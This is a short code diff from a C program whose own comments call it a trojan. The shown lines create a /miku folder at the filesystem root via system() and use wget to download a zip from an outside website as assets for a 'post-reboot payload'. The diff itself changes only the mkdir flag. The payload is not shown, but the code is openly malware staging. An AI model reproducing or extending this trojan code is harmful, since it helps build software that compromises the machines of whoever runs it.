@@ -18,7 +18,7 @@ int main()
 
     // This is the assets folder for the trojan.
     // It houses files that need downloading before the post-reboot payload as networking won't be available during the init step.
-    system("cd / && mkdir miku && cd miku ");
+    system("cd / && mkdir -p miku && cd miku");
 
     // This is a lot of shell commands, this trojan depends on wget which is an application, not a header file.
     system("wget https://aurascope.net/downloads/aurascope-beta-v0.3.2.zip");
